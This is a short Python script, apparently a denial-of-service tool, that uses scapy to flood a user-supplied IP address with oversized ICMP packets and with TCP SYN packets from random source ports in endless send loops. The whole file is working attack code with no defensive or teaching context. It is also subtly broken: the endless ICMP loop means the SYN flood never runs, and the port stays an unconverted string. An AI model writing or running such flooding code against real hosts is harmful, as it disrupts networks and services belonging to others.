from scapy.all import *


def syn_flood(target_ip, target_port):
    pkt = IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
    send(pkt, loop=1, verbose=False)


def icmp_flood(target_ip):
    pkt = IP(dst=target_ip) / ICMP() / (b"X" * 60000)
    send(pkt, loop=1, verbose=False)

target_ip = input("Target IP: ")
target_port = input("Target port: ")

icmp_flood(target_ip)
syn_flood(target_ip, target_port)